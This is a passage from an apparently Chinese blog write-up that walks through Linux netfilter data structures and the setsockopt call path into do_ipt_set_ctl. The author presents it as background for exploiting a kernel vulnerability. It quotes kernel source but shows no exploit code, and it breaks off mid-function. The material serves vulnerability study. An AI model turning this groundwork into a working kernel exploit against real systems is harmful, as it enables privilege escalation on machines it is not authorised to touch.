class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The table itself */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table_info</span> &#123;</span><br><span class="hljs-comment">/* Size per table */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br><span class="hljs-comment">/* Number of entries: FIXME. --RR */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> number;<br><span class="hljs-comment">/* Initial number of entries. Needed for module usage count */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> initial_entries;<br><br><span class="hljs-comment">/* Entry points and underflows */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook_entry[NF_INET_NUMHOOKS];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> underflow[NF_INET_NUMHOOKS];<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Number of user chains. Since tables cannot have loops, at most</span><br><span class="hljs-comment"> * @stacksize jumps (number of user chains) can possibly be made.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> stacksize;<br><span class="hljs-type">void</span> ***jumpstack;<span class="hljs-comment">// 我超，三级指针！</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> entries[] __aligned(<span class="hljs-number">8</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>在每张  table 上有多个 chain，对应表示报文的拦截处理点，例如网络层中的 IP协议 便有 5 个拦截点：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs coq">---&gt;[NF_IP_PRE_ROUTING]---&gt;[ROUTE]---&gt;[NF_IP_FORWARD]---&gt;[NF_IP_POST_ROUTING]---&gt;<br>                              |                        <span class="hljs-type">^</span><br><span class="hljs-type">                              |                        |</span><br><span class="hljs-type">                              |                     [ROUTE</span>]<br>                              v                        |<br>                       <span class="hljs-type">[NF_IP_LOCAL_IN</span>]        [NF_IP_LOCAL_OUT]<br>                              |                        <span class="hljs-type">^</span><br><span class="hljs-type">                              |                        |</span><br><span class="hljs-type">                              v</span>                        |<br>                             <span class="hljs-type">--------Local</span> Process-------<br></code></pre></td></tr></table></figure><p>在每个 chain 中还有一些用户配置的 rule，一条 rule 可能包含一个或多个匹配规则（match）和一个执行动作（target），若报文 match 了，则执行 target 来处理报文；标准的匹配元素包含源/目的IP地址、接收/发送设备、传输层协议这五个元素，标准的执行动作包含 <code>accept</code>、<code>drop</code>、<code>queue</code>、<code>return</code></p><p>每条 rule 使用一个 <code>ipt_entry</code> 结构表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This structure defines each of the firewall rules.  Consists of 3</span><br><span class="hljs-comment">   parts which are 1) general IP header stuff 2) match specific</span><br><span class="hljs-comment">   stuff 3) the target to perform if the rule matches */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_ip</span> <span class="hljs-title">ip</span>;</span><br><br><span class="hljs-comment">/* Mark with fields that we care about. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nfcache;<br><br><span class="hljs-comment">/* Size of ipt_entry + matches */</span><br>__u16 target_offset;<br><span class="hljs-comment">/* Size of ipt_entry + matches + target */</span><br>__u16 next_offset;<br><br><span class="hljs-comment">/* Back pointer */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> comefrom;<br><br><span class="hljs-comment">/* Packet and byte counters. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_counters</span> <span class="hljs-title">counters</span>;</span><br><br><span class="hljs-comment">/* The matches (if any), then the target. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> elems[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>而 rule 和 target 则分别使用 <code>xt_entry_match</code> 与 <code>xt_entry_target</code> 结构表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_match</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16 match_size;<br><br><span class="hljs-comment">/* Used by userspace */</span><br><span class="hljs-type">char</span> name[XT_EXTENSION_MAXNAMELEN];<br>__u8 revision;<br>&#125; user;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16 match_size;<br><br><span class="hljs-comment">/* Used inside the kernel */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_match</span> *<span class="hljs-title">match</span>;</span><br>&#125; kernel;<br><br><span class="hljs-comment">/* Total length */</span><br>__u16 match_size;<br>&#125; u;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_target</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16 target_size;<br><br><span class="hljs-comment">/* Used by userspace */</span><br><span class="hljs-type">char</span> name[XT_EXTENSION_MAXNAMELEN];<br>__u8 revision;<br>&#125; user;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16 target_size;<br><br><span class="hljs-comment">/* Used inside the kernel */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_target</span> *<span class="hljs-title">target</span>;</span><br>&#125; kernel;<br><br><span class="hljs-comment">/* Total length */</span><br>__u16 target_size;<br>&#125; u;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>table-&gt;chain-&gt;rule</code> 的关系如下图所示，这里我们可以看到对于单个 rule 在每个 CPU 上都维护了一份他的拷贝，这样做的目的是为了减少锁的使用、增加 L1 cache 的命中次数，以空间换时间</p><p><img src="https://s2.loli.net/2022/03/29/4hwpn7HdagVIiQL.png" alt="image.png"></p><h2 id="64-位下的-setsockopt-系统调用"><em>64 位下的 setsockopt 系统调用</em></h2><blockquote><p>和本漏洞没有关联，但是笔者没注意给分析了一遍…花了挺多力气所以这里也不想删了，就留下来了，如果只关注漏洞本身的可以直接跳过XD 感兴趣的话可以简单看看</p></blockquote><p>用户进程与 Netfilter 间进行通信主要是通过 <code>getsockopt</code> 与 <code>setsockopt</code> 这两个系统调用，这是一套配对使用的系统调用，用以读取或修改套接字的配置信息，我们这一次主要关注 <code>setsockopt</code></p><blockquote><p>本次漏洞利用中我们创建 socket 时使用 <code>socket(AF_INTE, SOCK_STREAM, 0)</code>，故后面涉及到的 socket 源码都会顺着这个路径分析</p></blockquote><p>在 <code>setsockopt</code> 系统调用中会调用到内核中的 <code>__sys_setsockopt()</code> ，最终调用到对应的 socket 结构体的函数表中的 <code>setsockopt</code> 函数指针（ <code>sock-&gt;ops-&gt;setsockopt()</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __sys_setsockopt(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,<br>    <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">int</span> optlen)<br>&#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (level == SOL_SOCKET)<br>err =<br>    sock_setsockopt(sock, level, optname, optval,<br>    optlen);<br><span class="hljs-keyword">else</span><br>err =<br>    sock-&gt;ops-&gt;setsockopt(sock, level, optname, optval,<br>  optlen);<br></code></pre></td></tr></table></figure><p>这个函数表其实是在 socket 创建时（<code>__sock_create()</code>）进行动态指定的，通过对应 family 指定的创建函数进行创建：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __sock_create(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">int</span> family, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol,<br> <span class="hljs-keyword">struct</span> socket **res, <span class="hljs-type">int</span> kern)<br>&#123;<br>    <span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">socket</span> *<span class="hljs-title">sock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> *<span class="hljs-title">pf</span>;</span><br>    <span class="hljs-comment">//...</span><br>rcu_read_lock();<br>pf = rcu_dereference(net_families[family]);<br>err = -EAFNOSUPPORT;<br><span class="hljs-keyword">if</span> (!pf)<br><span class="hljs-keyword">goto</span> out_release;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We will call the -&gt;create function, that possibly is in a loadable</span><br><span class="hljs-comment"> * module, so we have to bump that loadable module refcnt first.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!try_module_get(pf-&gt;owner))<br><span class="hljs-keyword">goto</span> out_release;<br><br><span class="hljs-comment">/* Now protected by module ref count */</span><br>rcu_read_unlock();<br><br>err = pf-&gt;create(net, sock, protocol, kern);<br></code></pre></td></tr></table></figure><p>比如说对于 <code>AF_INET</code> （<code>PF_INET</code>）而言，应该用到的是 <code>inet_create()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> <span class="hljs-title">inet_family_ops</span> =</span> &#123;<br>.family = PF_INET,<br>.create = inet_create,<br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 <code>inet_init()</code> 函数中使用 <code>sock_register</code> 在 <code>net_families</code> 数组中注册了该结构体（<code>__init</code> 宏可以看出这是一个模块初始化函数）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">inet_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Tell SOCKET that we are alive...</span><br><span class="hljs-comment"> */</span><br><br>(<span class="hljs-type">void</span>)sock_register(&amp;inet_family_ops);<br></code></pre></td></tr></table></figure><p>而在 <code>inet_create()</code> 中，则是遍历 数组找到对应类型的函数表给到 socket：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">inet_create</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> protocol,</span><br><span class="hljs-params">       <span class="hljs-type">int</span> kern)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_protosw</span> *<span class="hljs-title">answer</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_sock</span> *<span class="hljs-title">inet</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto</span> *<span class="hljs-title">answer_prot</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> answer_flags;<br><span class="hljs-type">int</span> try_loading_module = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (protocol &lt; <span class="hljs-number">0</span> || protocol &gt;= IPPROTO_MAX)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>sock-&gt;state = SS_UNCONNECTED;<br><br><span class="hljs-comment">/* Look for the requested type/protocol pair. */</span><br>lookup_protocol:<br>err = -ESOCKTNOSUPPORT;<br>rcu_read_lock();<br>list_for_each_entry_rcu(answer, &amp;inetsw[sock-&gt;type], <span class="hljs-built_in">list</span>) &#123;<br><br>err = <span class="hljs-number">0</span>;<br><span class="hljs-comment">/* Check the non-wild match. */</span><br><span class="hljs-keyword">if</span> (protocol == answer-&gt;protocol) &#123;<br><span class="hljs-keyword">if</span> (protocol != IPPROTO_IP)<br><span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Check for the two wild cases. */</span><br><span class="hljs-keyword">if</span> (IPPROTO_IP == protocol) &#123;<br>protocol = answer-&gt;protocol;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (IPPROTO_IP == answer-&gt;protocol)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>err = -EPROTONOSUPPORT;<br>&#125;<br>    <span class="hljs-comment">//...</span><br>    sock-&gt;ops = answer-&gt;ops;<br>    answer_prot = answer-&gt;prot;<br></code></pre></td></tr></table></figure><p>在这里使用内核的 rcu 遍历宏 <code>list_for_each_entry_rcu</code> 对 <code>inetsw</code> 进行遍历，实际上该链表通过 <code>inetsw_array</code> 建立，对于 <code>IPPROTO_IP</code> 而言其函数表应为 <code>inet_stream_ops</code>（我们在建立 socket 时 protocol 指定为 0，即 <code>IPPROTO_IP</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_protosw</span> <span class="hljs-title">inetsw_array</span>[] =</span><br>&#123;<br>&#123;<br>.type =       SOCK_STREAM,<br>.protocol =   IPPROTO_TCP,<br>.prot =       &amp;tcp_prot,<br>.ops =        &amp;inet_stream_ops,<br>.flags =      INET_PROTOSW_PERMANENT |<br>      INET_PROTOSW_ICSK,<br>&#125;,<br></code></pre></td></tr></table></figure><p>因此我们在进行 setsockopt 时其实对应应该调用到 <code>inet_stream_ops</code> 中的 <code>sock_common_setsockopt</code>，他又会调用到 <code>sk-&gt;sk_prot-&gt;setsockopt()</code>，其实就是 socket 结构体里的 sock 结构体里的 sock_common 结构体的 <code>skc_prot</code> 成员（<code>proto</code> 结构体类型）的 <code>setsockopt</code> 函数指针（<s>你套你🦄呢</s>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sock_common_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params">   <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span> =</span> sock-&gt;sk;<br><br><span class="hljs-keyword">return</span> sk-&gt;sk_prot-&gt;setsockopt(sk, level, optname, optval, optlen);<br>&#125;<br>EXPORT_SYMBOL(sock_common_setsockopt);<br></code></pre></td></tr></table></figure><p>又绕回前面，这里应该是对应到 <code>tcp_prot</code> 函数表，对应调用到 <code>tcp_setsockopt()</code>，在公开的 exp 中漏洞触发路径指定了 level 为 <code>SOL_IP</code>，所以这里应该会对应调用到 <code>icsk-&gt;icsk_af_ops-&gt;setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">tcp_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname, <span class="hljs-type">char</span> __user *optval,</span><br><span class="hljs-params">   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock</span> *<span class="hljs-title">icsk</span> =</span> inet_csk(sk);<br><br><span class="hljs-keyword">if</span> (level != SOL_TCP)<br><span class="hljs-keyword">return</span> icsk-&gt;icsk_af_ops-&gt;setsockopt(sk, level, optname,<br>     optval, optlen);<br><span class="hljs-keyword">return</span> do_tcp_setsockopt(sk, level, optname, optval, optlen);<br>&#125;<br>EXPORT_SYMBOL(tcp_setsockopt);<br></code></pre></td></tr></table></figure><p>这里 <code>inet_csk()</code> 展开其实就是一个强制类型转换，那这里我们又要转回去看 socket 中 sock 结构体的初始化过程，在 <code>inet_create()</code>  中使用 <code>sock_alloc()</code> 创建 sock 结构体，最后会调用到 <code>tcp_v4_init_sock</code>，这里我们看到其初始化所用的函数表为 <code>ipv4_specific</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tcp_v4_init_sock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock</span> *<span class="hljs-title">icsk</span> =</span> inet_csk(sk);<br><br>tcp_init_sock(sk);<br><br>icsk-&gt;icsk_af_ops = &amp;ipv4_specific;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_TCP_MD5SIG</span><br>tcp_sk(sk)-&gt;af_specific = &amp;tcp_sock_ipv4_specific;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以最后应该调用到 <code>ip_setsockopt</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock_af_ops</span> <span class="hljs-title">ipv4_specific</span> =</span> &#123;<br><span class="hljs-comment">//...</span><br>.setsockopt   = ip_setsockopt,<br>.getsockopt   = ip_getsockopt,<br></code></pre></td></tr></table></figure><p>在  <code>ip_setsockopt</code> 中最终调用到 <code>nf_setsockopt</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level,</span><br><span class="hljs-params"><span class="hljs-type">int</span> optname, <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (level != SOL_IP)<br><span class="hljs-keyword">return</span> -ENOPROTOOPT;<br><br>err = do_ip_setsockopt(sk, level, optname, optval, optlen);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_BPFILTER_UMH)</span><br><span class="hljs-keyword">if</span> (optname &gt;= BPFILTER_IPT_SO_SET_REPLACE &amp;&amp;<br>    optname &lt; BPFILTER_IPT_SET_MAX)<br>err = bpfilter_ip_set_sockopt(sk, optname, optval, optlen);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER</span><br><span class="hljs-comment">/* we need to exclude all possible ENOPROTOOPTs except default case */</span><br><span class="hljs-keyword">if</span> (err == -ENOPROTOOPT &amp;&amp; optname != IP_HDRINCL &amp;&amp;<br>optname != IP_IPSEC_POLICY &amp;&amp;<br>optname != IP_XFRM_POLICY &amp;&amp;<br>!ip_mroute_opt(optname))<br>err = nf_setsockopt(sk, PF_INET, optname, optval, optlen);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> err;<br>&#125;<br>EXPORT_SYMBOL(ip_setsockopt);<br></code></pre></td></tr></table></figure><p>而 setsockopt 与 getsockopt 其实都整合到了 <code>nf_sockopt()</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Call get/setsockopt() */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_sockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf, <span class="hljs-type">int</span> val,</span><br><span class="hljs-params">      <span class="hljs-type">char</span> __user *opt, <span class="hljs-type">int</span> *len, <span class="hljs-type">int</span> get)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">int</span> ret;<br><br>ops = nf_sockopt_find(sk, pf, val, get);<br><span class="hljs-keyword">if</span> (IS_ERR(ops))<br><span class="hljs-keyword">return</span> PTR_ERR(ops);<br><br><span class="hljs-keyword">if</span> (get)<br>ret = ops-&gt;get(sk, val, opt, len);<br><span class="hljs-keyword">else</span><br>ret = ops-&gt;<span class="hljs-built_in">set</span>(sk, val, opt, *len);<br><br>module_put(ops-&gt;owner);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">nf_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf, <span class="hljs-type">int</span> val, <span class="hljs-type">char</span> __user *opt,</span><br><span class="hljs-params">  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-keyword">return</span> nf_sockopt(sk, pf, val, opt, &amp;len, <span class="hljs-number">0</span>);<br>&#125;<br>EXPORT_SYMBOL(nf_setsockopt);<br></code></pre></td></tr></table></figure><p>这里我们看出其通过 <code>nf_sockopt_find</code> 找到对应的函数表从而调用其对应的函数，这里 setsockopt 对应调用到的应该是 <code>do_ipt_set_ctl()</code></p><p><img src="https://s2.loli.net/2022/03/29/R4a7BPc8zq9Ko25.png" alt="image.png"></p><p>为什么是这个函数？这里我们回到 <code>nf_sockopt_find</code> 中，其使用内核双向链表遍历宏遍历全局变量<code>nf_sockopts</code>，判断条件是函数表的 pf 等于我们在上层传入的 pf（在 <code>ip_setsockopt</code> 中传入的为 <code>PF_INET</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> nf_sockopt_ops *<span class="hljs-title function_">nf_sockopt_find</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> 